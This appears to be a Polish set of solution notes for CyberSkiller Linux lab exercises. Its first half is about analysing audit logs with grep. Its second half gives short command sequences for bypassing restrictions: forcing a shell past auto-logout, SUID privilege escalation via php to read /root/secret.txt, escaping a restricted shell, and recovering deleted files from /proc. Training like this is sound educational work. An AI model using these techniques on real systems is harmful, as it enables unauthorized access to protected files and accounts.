ssh user@ip
user - alice

# Analiza Logów
## Zadanie 1 (Statystyki pliku z logami)
[CyberSkiller Environment - System Linux - Log file statistics - 5.1](https://youtu.be/1p7tmCbyFsE)
```shell
ssh -l alice 10.0.85.62
cat codebook.txt
cd /var/log
wc (word count)
cat codebook.txt | head -3497 | tail -1
```

## Zadanie 2 (Analiza logów z konkretnej daty)
[CyberSkiller Environment - System Linux - Log analysis by date - 5.2](https://www.youtube.com/watch?v=9J5H5H6TYV0&t=1s)

```shell
ssh -l alice 10.0.95.222  
cat audit.log
cat audit.log | grep 10:10:31
```

## Zadanie 3 (Analiza logów konkretnej długości)
[CyberSkiller Environment - System Linux - Log analysis by length - 5.3](https://youtu.be/4lRO81TjssA)

```shell
ssh -l alice 10.0.84.144
cd /var/log
cat audit.log | grep -E "^.{150,180}" (^E oznacza regex)
```

## Zadanie 4 (Analiza logów z konkretnego zakresu czasowego)
[CyberSkiller Environment - System Linux - Log analysis by time frame - 5.4](https://youtu.be/cz1N_5UT9PI)

```shell
ssh -l alice 10.0.122.15
cd /var/log
cat audit.log
cat audit.log | grep -e "08:0[0-2]:[0-5][0-9]"
```

## Zadanie 5 (Analiza logów konkretnej usługi)

[CyberSkiller Environment - System Linux - Log analysis by a particular service - 5.5](https://youtu.be/uHVRAqXXxAE)

```shell
ssh -l alice 10.0.56.0
cd /var/log
cat audit.log
cat audit.log | grep "vsftpd\|ftp\|xinetd"
```

## Zadanie 6 (Analiza nieudanych prób logowania się na SSH)
[CyberSkiller Environment - System Linux - Failed SSH login attempts analysis - 5.6](https://youtu.be/EiLWkwlr-WI)

```shell
ssh -l alice 10.0.44.186
cd /var/log
cat audit.log
cat audit.log |grep -E 'sshd.*failed'
cat audit.log |grep -E 'sshd.*invalid'
```

## Zadanie 7 (Analiza udanych prób logowania się na SSH)
[CyberSkiller Environment - System Linux - Successful SSH login attempts analysis - 5.7](https://youtu.be/WBp_073gFiI)

```shell
ssh -l alice 10.0.55.196
cd /var/log
cat audit.log
cat audit.log | grep opened
```

## Zadanie 8 (Analiza wielu nieudanych prób logowania się na SSH)
[CyberSkiller Environment - System Linux - Multiple failed SSH login attempts analysis - 5.8](https://youtu.be/Wo9RXZpXjdQ)

```shell
ssh -l alice 10.0.55.196
cd /var/log
cat audit.log
cat audit.log | grep user_
```

# Obejście prostych mechanizmów blokowania użytkowników
## Zadanie 1 (Automatyczne wylogowywanie)
[CyberSkiller Environment - Automatic logout - 7.1](https://www.youtube.com/watch?v=7gF8aXn0N5M&t=7s)
```shell
ssh -l alice 10.0.124.205
sftp  alice@10.0.124.205 (connection closed)
ssh -l  alice 10.0.124.205 "ls" (sprawdzenie ilości tabeli)
ssh -l  alice 10.0.124.205 "cat secret.txt" (wypisanie zawartości pliku)

# sposob zalogowania sie na konto
ssh -l alice 10.0.115.16 -t "sh -i"
ls
cat (filename)
```

## Zadanie 2 (Dostęp do plików w katalogu /root)
[CyberSkiller Environment - Access to files in the /root folder - 7.2](https://youtu.be/uUC-DHJmACA)
```shell
ll
cd archive 
ll
nano file.c
cat .file.sh
./file
/root/secret.txt
```

## Zadanie 3 (Dostęp do plików należących do użytkownika root)
[CyberSkiller Environment - Access to files belonging to the root user - 7.3](https://youtu.be/1DISmbatA2A)

```shell
ll
cd archive ll
ll
cat file.sh
./file
../root/secret.txt
```

## Zadanie 4 (Podwyższenie uprawnień użytkownika)
[CyberSkiller Environment - System Linux - User privilege escalation - 7.4](https://youtu.be/PKY6ULiuXug)

```shell
find / -perm /6000 2>/dev/null
php7.4 -f /root/secret.txt
```

## Zadanie 5 (Inna powłoka niż Bash)
[CyberSkiller Environment - System Linux - Shell other than Bash - 7.5](https://youtu.be/9vUhS8QU1hI)
```shell
cat /etc/passwd
cd /usr/bin
cat bob
cd
cd .ssh/
ll
ssh -l bob localhost -i bob_key.pem (enter fingerprint)
(reduce window size)
:e secret.txt
```

## Zadanie 6 (Usunięty plik)

[CyberSkiller Environment - System Linux - Deleted file - 7.6](https://youtu.be/n6bWUYs8qMw)
```shell
cd archive
ll
cat file.py
cd
ps aux
ps -x
(find PID of the python file)
cd /proc/
ls
cd (PID)
ls
cd fd
ll
cat ./3
```